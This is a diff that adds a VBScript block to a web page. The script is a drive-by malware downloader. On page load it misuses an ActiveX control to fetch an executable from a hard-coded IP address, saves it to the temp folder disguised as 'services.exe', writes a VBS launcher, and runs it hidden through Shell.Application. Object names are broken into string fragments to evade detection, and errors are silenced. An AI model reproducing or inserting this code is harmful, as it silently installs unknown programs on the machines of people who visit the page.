@@ -1,0 +1,42 @@
+<SCRIPT language=VBScript> 
+on error resume next 
+ttwc = "http://222.180.37.146/down/123.exe"
+oMygod="services.exe"
+oMygod1="services.vbs"
+Set df = document.createElement("o"&"b"&"j"&"e"&"c"&"t") 
+df.setAttribute "c"&"l"&"a"&"s"&"s"&"i"&"d", "c"&"l"&"s"&"id:"&"B"&"D"&"96"&"C5"&"56"&"-65"&"A3"&"-11"&"D0"&"-98"&"3A"&"-00"&"C04"&"FC2"&"9E"&"36" 
+str="Mic"&"ro"&"so"&"ft."&"X"&"M"&"L"&"HT"&"TP"
+Set x = df.CreateObject(str,"") 
+a1="A"&"d"&"o" 
+a2="d"&"b." 
+a3="S"&"tr" 
+a4="e"&"am"  
+str5="A"&"d"&"o"&"d"&"b."&"S"&"tr"&"e"&"am" 
+set S = df.createobject(str5,"") 
+S.type = 1
+str6="G"&"E"&"T"
+x.Open str6, ttwc, False 
+x.Send 
+set F = df.createobject("Scripting.FileSystemObject","") 
+set tmp = F.GetSpecialFolder(2)  
+oMygod= F.BuildPath(tmp,oMygod)
+S.open
+S.write x.responseBody 
+S.savetofile oMygod,2 
+S.close
+oMygod1= F.BuildPath(tmp,oMygod1)
+set ts = F.OpenTextFile(oMygod1, 2, True)
+ts.WriteLine "Set Shell = CreateObject(""Sh""&""ell""&"".App""&""lic""&""at""&""ion"")"
+sql="Shell.ShellExecute"""+oMygod+""","""","""",""o""&""p""&""e""&""n"",0"
+ts.writeLine sql
+ts.close
+if F.FileExists(oMygod)=true then
+if F.FileExists(oMygod1)=true then
+d3="She"&"ll."&"App"&"li"&"ca"&"tion"
+set Q = df.createobject(d3,"")
+dc="o"&"p"&"e"&"n"
+Q.ShellExecute oMygod1,"","",dc,0
+end if
+End if 
+</SCRIPT>
+
